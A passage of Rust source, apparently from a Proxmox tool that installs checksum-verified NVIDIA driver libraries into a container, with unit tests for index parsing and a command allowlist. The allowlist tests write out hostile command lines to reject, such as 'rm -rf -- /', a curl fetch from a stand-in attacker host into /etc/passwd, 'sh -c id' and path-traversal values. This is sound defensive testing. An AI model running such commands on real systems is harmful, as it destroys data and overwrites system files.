    }
    let q = long_s(c.qs);
    if we_stopped_it {
        match c.cx.host_cmd(&argv(&g.ct_start(vmid)), &long_s(90)) {
            Ok(0) => {}
            r => return done(c, Outcome::Failed, &format!("cannot start the CT: {}", describe(&r))),
        }
    }
    match c.cx.guest(CT_DF, &q) {
        Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_CT_KB) => {}
        Ok(0) => return done(c, Outcome::Failed, &format!("not enough free space in the CT (/var/lib): {} MB needed", MIN_FREE_CT_KB / 1024)),
        r => return done(c, Outcome::Failed, &format!("cannot check CT free space: {}", describe(&r))),
    }
    let dir = match c.cx.guest(CT_MKTEMP, &q) {
        Ok(0) => c.cx.capture.iter().map(|l| l.trim()).find(|l| !l.is_empty()).map(String::from),
        r => return done(c, Outcome::Failed, &format!("cannot create a private directory in the CT: {}", describe(&r))),
    };
    let Some(dir) = dir.filter(|d| ct_dir_ok(d)) else {
        return done(c, Outcome::Failed, "the CT returned an unexpected temporary directory; nothing was copied");
    };
    let mut result = match c.cx.host_cmd(&argv(&g.ct_push(vmid, &dir)), &long_s(FETCH_S)) {
        Ok(0) => {
            // el directorio es de root y 0700; aun así se revisa lo copiado justo antes de ejecutarlo
            let sha = match c.cx.guest(&argv(&ct_sha(&dir)), &q) {
                Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
                _ => None,
            };
            if sha.as_deref() != Some(want) {
                Some("the installer copied into the CT does not match the verified SHA-256; not executed".to_string())
            } else {
                match c.cx.guest(&argv(&ct_libs_argv(&dir)), &long()) {
                    Ok(0) => None,
                    r => Some(format!("the libs installer failed: {}", describe(&r))),
                }
            }
        }
        r => Some(format!("cannot copy the installer into the CT: {}", describe(&r))),
    };
    let _ = c.cx.guest(&argv(&ct_rm(&dir)), &q);
    if result.is_none() {
        let v = match c.cx.guest(hostcheck::NVIDIA_SMI, &q) {
            Ok(0) => hostcheck::parse_smi_version(&c.cx.capture),
            _ => None,
        };
        if v.as_deref() != Some(g.version.as_str()) {
            result = Some(format!("verification failed: nvidia-smi in the CT reports {}", v.as_deref().unwrap_or("nothing")));
        }
    }
    match result {
        Some(why) => done(c, Outcome::Failed, &why),
        None => match c.cx.host_cmd(&argv(&g.ct_reboot(vmid)), &long_s(120)) {
            Ok(0) => done(c, Outcome::Ok, &format!("libs {} installed, CT restarted", g.version)),
            r => done(c, Outcome::Warn, &format!("libs {} installed but the CT restart failed ({})", g.version, describe(&r))),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const HTML: &str = "<html><body><a href='../'>../</a>\n<span class='dir'><a href='590.48.01/'>590.48.01/</a></span>\n<span class='dir'><a href='595.58.03/'>595.58.03/</a></span>\n<span class='dir'><a href='595.80/'>595.80/</a></span>\n<span class='dir'><a href='595.112.07/'>595.112.07/</a></span>\n<span class='dir'><a href='596.10.01/'>596.10.01/</a></span>\n<a href='latest.txt'>latest.txt</a>\n<a href='1.0-9746/'>x</a>\n<a href=\"595.112.07/\">dup double quotes</a></body></html>";

    #[test]
    fn index_lists_numeric_version_dirs_sorted_and_deduped() {
        let v = parse_index(HTML);
        assert_eq!(v, ["590.48.01", "595.58.03", "595.80", "595.112.07", "596.10.01"]);
    }

    #[test]
    fn index_parses_a_literal_fragment_of_the_real_nvidia_page() {
        // Fragmento literal de https://download.nvidia.com/XFree86/Linux-x86_64/ (curl, 2026-11-09): comillas simples.
        let real = "      <span class='dir'><a href='595.45.04/'>595.45.04/</a></span>\n      <span class='dir'><a href='595.58.03/'>595.58.03/</a></span>\n      <span class='dir'><a href='595.84/'>595.84/</a></span>\n      <span class='dir'><a href='595.91.07/'>595.91.07/</a></span>\n      <span class='dir'><a href='595.99.02/'>595.99.02/</a></span>\n      <span class='dir'><a href='595.104.02/'>595.104.02/</a></span>\n      <span class='dir'><a href='595.112.07/'>595.112.07/</a></span>\n";
        let v = parse_index(real);
        assert_eq!(v.len(), 7);
        assert_eq!(newest_in_branch(&v, "595.45.04").as_deref(), Some("595.112.07"));
    }

    #[test]
    fn sha_parses_the_real_two_space_format() {
        let real = "8c0d4f967b7932c4ab5714272aee8103392b0a702c92afa555176d36205829f9  NVIDIA-Linux-x86_64-595.58.03.run\n";
        assert_eq!(parse_sha(real, "NVIDIA-Linux-x86_64-595.58.03.run").as_deref(), Some("8c0d4f967b7932c4ab5714272aee8103392b0a702c92afa555176d36205829f9"));
    }

    #[test]
    fn newest_stays_inside_the_same_major_branch() {
        let v = parse_index(HTML);
        assert_eq!(newest_in_branch(&v, "595.58.03").as_deref(), Some("595.112.07"));
        assert_eq!(newest_in_branch(&v, "595.112.07"), None, "already the newest of 595.x (596 is another branch)");
        assert_eq!(newest_in_branch(&v, "590.48.01"), None);
        assert_eq!(newest_in_branch(&v, "garbage"), None);
        // 2 tramos contra 3: 595.80 < 595.112.07 (numérico, no de texto)
        assert_eq!(version_cmp("595.80", "595.112.07"), Ordering::Less);
    }

    #[test]
    fn sha_file_must_name_the_expected_run() {
        let h = "a".repeat(64);
        assert_eq!(parse_sha(&format!("{h}  NVIDIA-Linux-x86_64-1.2.run\n"), "NVIDIA-Linux-x86_64-1.2.run"), Some(h.clone()));
        assert_eq!(parse_sha(&format!("{h}  other.run"), "NVIDIA-Linux-x86_64-1.2.run"), None);
        assert_eq!(parse_sha("zz  NVIDIA-Linux-x86_64-1.2.run", "NVIDIA-Linux-x86_64-1.2.run"), None);
        assert_eq!(parse_sha("", "x"), None);
    }

    #[test]
    fn flavor_follows_the_loaded_module() {
        assert_eq!(flavor_of("NVRM version: NVIDIA UNIX Open Kernel Module for x86_64  595.112.07"), "open");
        assert_eq!(flavor_of("NVRM version: NVIDIA UNIX x86_64 Kernel Module  595.112.07"), "proprietary");
    }

    #[test]
    fn grant_only_allows_its_exact_commands() {
        let g = Grant::new("595.120.01", "6.17.9-1-pve", "proprietary", vec![134], vec![134]).unwrap();
        for f in g.fixed() {
            assert!(is_host_argv(&argv(&f), &g), "{f:?}");
        }
        let d = format!("{CT_DIR_PREFIX}Ab3dE9xZ");
        assert!(is_host_argv(&argv(&g.ct_push(134, &d)), &g));
        assert!(!is_host_argv(&argv(&g.ct_push(999, &d)), &g), "other CT");
        for bad in ["/var/tmp/pxu-nvidia.run", "/var/tmp/pxu-nvidia.Ab3dE9xZ", "/var/lib/pxu-nvidia.short", "/var/lib/pxu-nvidia.Ab3dE9xZ/../x", "/var/lib/pxu-nvidia.Ab3dE9x/", "/etc"] {
            assert!(!is_host_argv(&argv(&g.ct_push(134, bad)), &g), "{bad}");
            assert!(!is_guest_argv(&argv(&ct_libs_argv(bad)), 134, &g), "{bad}");
            assert!(!is_guest_argv(&argv(&ct_rm(bad)), 134, &g), "{bad}");
            assert!(!ct_dir_ok(bad), "{bad}");
        }
        assert!(!is_host_argv(&["pct", "stop", "999"], &g));
        assert!(!is_host_argv(&["sh", "/var/lib/pxu-nvidia/other.run", "--check"], &g), "other version/file");
        assert!(!is_host_argv(&["modprobe", "-r", "nvidia", "--force"], &g));
        assert!(!is_host_argv(&["rm", "-rf", "--", "/"], &g));
        assert!(!is_host_argv(&["rm", "-rf", "--", "/var/tmp"], &g));
        assert!(!is_host_argv(&["curl", "-o", "/etc/passwd", "https://evil.example/x.run"], &g));
        let libs_v = ct_libs_argv(&d);
        let libs = argv(&libs_v);
        assert!(is_guest_argv(&libs, 134, &g) && !is_guest_argv(&libs, 135, &g));
        assert!(is_guest_argv(CT_MKTEMP, 134, &g) && is_guest_argv(&argv(&ct_sha(&d)), 134, &g) && is_guest_argv(&argv(&ct_rm(&d)), 134, &g));
        assert!(!is_guest_argv(&["rm", "-rf", "--", "/var/lib"], 134, &g));
        assert!(!is_guest_argv(&["sh", "-c", "id"], 134, &g));
        assert!(Grant::new("../../x", "6.1", "open", vec![], vec![]).is_none());
        assert!(Grant::new("595.1.2", "6.1/../x", "open", vec![], vec![]).is_none());
        assert!(Grant::new("595.1.2", "6.1", "weird", vec![], vec![]).is_none());
    }
}
